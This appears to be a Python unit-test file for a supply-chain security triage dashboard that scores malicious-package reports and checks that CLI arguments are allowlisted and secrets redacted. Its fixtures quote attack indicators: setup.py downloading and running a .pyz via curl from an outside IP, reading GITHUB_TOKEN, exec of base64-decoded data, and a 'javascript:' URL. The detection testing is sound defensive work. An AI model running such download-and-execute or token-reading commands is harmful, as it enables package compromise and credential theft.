#!/usr/bin/env python3
import inspect
import tempfile
import unittest
from pathlib import Path
from unittest import mock
import sys

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import dashboard_server as server


class TriageOpsEvidenceTests(unittest.TestCase):
    def finding(self, package='mistralai', version='2.4.6', analysis='Deterministic rules flagged: credential-access, network-egress'):
        return {
            'finding_id': 'SCM-0F5D5BD1A07E9184',
            'ecosystem': 'pypi',
            'package': package,
            'new_version': version,
            'analysis': analysis,
            'report_path': '/Users/chrixchange/secopsai/data/supply_chain/reports/sample.md',
        }

    def test_advisory_backed_mistralai_is_likely_true_positive_without_local_usage(self):
        payload = server.build_evidence_verdict_payload(
            self.finding(),
            advisory={'matched': True, 'matches': [{'source_urls': ['https://example.test/advisory']}]},
            local_usage={'present': False, 'matches': [], 'searched_files': 3},
            report={
                'ok': True,
                'path': '/Users/chrixchange/secopsai/data/supply_chain/reports/sample.md',
                'text': 'Import-time execution downloads https://git-tanstack.com/transformers.pyz to /tmp/transformers.pyz and runs python3 /tmp/transformers.pyz while reading token environment variables.',
            },
            explanation={'matched_rules': ['credential-access', 'network-egress']},
        )
        self.assertIn(payload['package_verdict'], {'confirmed_true_positive', 'likely_true_positive'})
        self.assertEqual(payload['environment_impact'], 'not_observed')
        self.assertEqual(payload['recommended_disposition'], 'needs_review')
        self.assertGreaterEqual(payload['score'], 65)
        self.assertTrue(payload['references'])

    def test_absence_of_local_usage_does_not_override_package_verdict(self):
        payload = server.build_evidence_verdict_payload(
            self.finding(),
            advisory={'matched': True, 'matches': []},
            local_usage={'present': False, 'matches': []},
            report={'ok': True, 'text': 'setup.py contains a curl https://83.142.209.194/transformers.pyz call'},
            explanation={},
        )
        self.assertNotIn(payload['package_verdict'], {'false_positive', 'likely_false_positive'})
        self.assertEqual(payload['environment_impact'], 'not_observed')

    def test_weak_litellm_example_trends_false_positive(self):
        payload = server.build_evidence_verdict_payload(
            self.finding(package='litellm', version='1.85.0rc2', analysis='Deterministic rules flagged: generic metadata heuristic'),
            advisory={'matched': False, 'matches': []},
            local_usage={'present': False, 'matches': [], 'searched_files': 3},
            report={'ok': True, 'text': 'Report mostly contains generated asset and normal framework API client code.'},
            explanation={'matched_rules': ['generic metadata heuristic']},
        )
        self.assertIn(payload['package_verdict'], {'likely_false_positive', 'false_positive', 'needs_review'})
        self.assertLessEqual(payload['score'], 35)
        self.assertEqual(payload['environment_impact'], 'not_observed')

    def test_raw_report_strong_indicators_raise_score(self):
        evidence = server.parse_report_evidence(
            'setup.py writes /tmp/payload, calls curl https://example.test/a.py, reads GITHUB_TOKEN, then exec(base64.b64decode(blob))',
            ['example.test'],
        )
        self.assertTrue(evidence['signals']['install_time_execution'])
        self.assertTrue(evidence['signals']['outbound_network'])
        self.assertTrue(evidence['signals']['credential_access'])
        self.assertTrue(evidence['signals']['obfuscation'])
        self.assertTrue(evidence['signals']['suspicious_file_writes'])
        self.assertTrue(evidence['signals']['known_ioc_matches'])

    def test_campaign_payload_accepts_cross_ecosystem_packages(self):
        payload = server.validate_campaign_payload(
            {
                'campaign_id': 'cross-ecosystem-test',
                'source_urls': ['https://example.test/report'],
                'packages': [
                    {'ecosystem': 'npm', 'package': '@scope/pkg', 'version': '1.2.3'},
                    {'ecosystem': 'maven', 'package': 'com.example:artifact', 'version': '1.2.3'},
                    {'ecosystem': 'huggingface', 'package': 'org/model', 'version': 'main'},
                ],
            }
        )
        self.assertEqual(len(payload['packages']), 3)
        self.assertEqual(payload['packages'][1]['package'], 'com.example:artifact')

    def test_campaign_payload_rejects_unsupported_ecosystem(self):
        with self.assertRaises(ValueError):
            server.validate_campaign_payload(
                {
                    'campaign_id': 'bad',
                    'packages': [{'ecosystem': 'apt', 'package': 'curl', 'version': '1.0'}],
                }
            )

    def test_campaign_research_args_are_allowlisted(self):
        args = server.build_campaign_research_args('/tmp/campaign.json', persist=True, search_root='/Users/chrixchange/secopsai')
        self.assertEqual(args[:3], ['supply-chain', 'research-campaign', '--input'])
        self.assertIn('--persist', args)
        self.assertIn('--search-root', args)
        self.assertNotIn(';', ' '.join(args))

    def test_campaign_discovery_args_are_allowlisted(self):
        args = server.build_campaign_discover_args({'since': '24h', 'source': 'Socket', 'limit': 12})
        self.assertEqual(args[:3], ['supply-chain', 'discover-campaigns', '--since'])
        self.assertIn('Socket', args)
        self.assertNotIn(';', ' '.join(args))

    def test_campaign_autopilot_args_protect_persist_mode(self):
        args, needs_admin = server.build_campaign_autopilot_args({'since': '24h', 'limit': 5, 'persist': True, 'create_drafts': True})
        self.assertTrue(needs_admin)
        self.assertIn('--persist', args)
        self.assertIn('--create-drafts', args)
        self.assertNotIn(';', ' '.join(args))

    def test_campaign_actions_are_not_finding_actions(self):
        self.assertIn('campaign-autopilot', server.CAMPAIGN_TRIAGE_OPS_ACTIONS)
        self.assertIn('campaign-discover', server.CAMPAIGN_TRIAGE_OPS_ACTIONS)
        self.assertIn('campaign-orchestrate', server.CAMPAIGN_TRIAGE_OPS_ACTIONS)
        self.assertIn('research-campaign', server.CAMPAIGN_TRIAGE_OPS_ACTIONS)

    def test_campaign_watchlist_args_validate_source_url(self):
        args = server.build_campaign_watchlist_args({'package': 'npm:chalk-tempalte'})
        self.assertEqual(args[:3], ['supply-chain', 'campaign-watchlist', 'add'])
        self.assertIn('--package', args)
        with self.assertRaises(ValueError):
            server.build_campaign_watchlist_args({'source_url': 'javascript:alert(1)'})

    def test_campaign_fixture_loads_without_temp_paths(self):
        fixtures = server.campaign_fixture_payloads()
        self.assertTrue(fixtures)
        self.assertEqual(fixtures[0]['campaign']['campaign_id'], 'deadcode09284814-infostealer-botnet-campaign')
        self.assertNotIn('/tmp/secopsai-campaign', str(fixtures[0]))
        self.assertNotIn('/Users/chrixchange', str(fixtures[0]))

    def test_compact_cli_result_redacts_secret_like_values(self):
        compact = server.compact_cli_result(
            {'ok': True, 'returncode': 0, 'stdout': 'GITHUB_TOKEN=ghp_this_should_hide', 'stderr': ''}
        )
        self.assertNotIn('ghp_this_should_hide', compact['stdout'])
        self.assertIn('[redacted]', compact['stdout'])

    def test_local_blog_ops_action_args_are_allowlisted(self):
        args = server.build_blog_ops_action_args('publish-approved', {'limit': 5})
        self.assertEqual(args, ['blog', 'news-publish-approved', '--rebuild'])
        args = server.build_blog_ops_action_args('approve', {'note': 'Reviewed source-backed draft'}, draft='news-example')
        self.assertEqual(args[:3], ['blog', 'news-review', 'approve'])
        self.assertIn('news-example', args)
        self.assertNotIn(';', ' '.join(args))

    def test_local_blog_ops_global_action_buttons_map_to_expected_cli(self):
        expected = {
            'news-fetch': ['blog', 'news-fetch', '--limit', '7'],
            'news-draft': ['blog', 'news-draft', '--limit', '7'],
            'news-run': ['blog', 'news-run', '--limit', '7'],
            'publish-approved': ['blog', 'news-publish-approved', '--rebuild'],
            'rebuild-feeds': ['blog', 'rebuild-feeds'],
        }
        for action, cli in expected.items():
            with self.subTest(action=action):
                self.assertEqual(server.build_blog_ops_action_args(action, {'limit': 7}), cli)
        with self.assertRaises(ValueError):
            server.build_blog_ops_action_args('deploy', {'limit': 7})

    def test_local_blog_ops_deploy_availability_uses_allowlisted_tools(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / 'blog').mkdir()
            with mock.patch.object(server, 'SECOPSAI_ROOT', root), mock.patch.object(server.shutil, 'which') as which:
                which.side_effect = lambda name: f'/usr/bin/{name}' if name == 'wrangler' else None
                self.assertTrue(server.local_blog_deploy_available())

    def test_local_blog_ops_deploy_is_separate_allowlist(self):
        with self.assertRaises(ValueError):
            server.build_blog_ops_action_args('deploy', {'limit': 5})

    def test_local_blog_ops_deploy_marks_staged_drafts_deployed_after_wrangler(self):
        source = inspect.getsource(server.DashboardHandler.do_POST)
        deploy_index = source.index("run_local_blog_deploy")
        mark_index = source.index("news-mark-deployed")
        self.assertGreater(mark_index, deploy_index)
        self.assertIn("'deployed_state'", source)

    def test_local_blog_ops_deploy_command_is_allowlisted(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / 'blog').mkdir()
            with mock.patch.object(server, 'SECOPSAI_ROOT', root), mock.patch.object(server.shutil, 'which') as which:
                which.side_effect = lambda name: f'/usr/bin/{name}' if name == 'wrangler' else None
                command = server.local_blog_deploy_command()
        self.assertEqual(command[:4], ['/usr/bin/wrangler', 'pages', 'deploy', str((root / 'blog').resolve())])
        self.assertIn('--project-name', command)
        self.assertIn('secopsai-blog', command)
        self.assertIn('--branch', command)
        self.assertIn('main', command)
        self.assertNotIn(';', ' '.join(command))

    def test_dependency_usage_reuses_manifest_text_cache(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            manifest = root / 'package.json'
            manifest.write_text('{"dependencies":{"demo-package":"1.2.3"}}', encoding='utf-8')
            server._DEPENDENCY_TEXT_CACHE.clear()
            with mock.patch.object(server, 'dependency_manifest_paths', return_value=[manifest]):
                first = server.check_local_dependency_usage('demo-package', '1.2.3')
            with mock.patch.object(server, 'dependency_manifest_paths', return_value=[manifest]), \
                 mock.patch.object(Path, 'read_text', side_effect=AssertionError('cache miss')):
                second = server.check_local_dependency_usage('demo-package', '1.2.3')

            self.assertTrue(first['present'])
            self.assertTrue(second['present'])


if __name__ == '__main__':
    unittest.main()
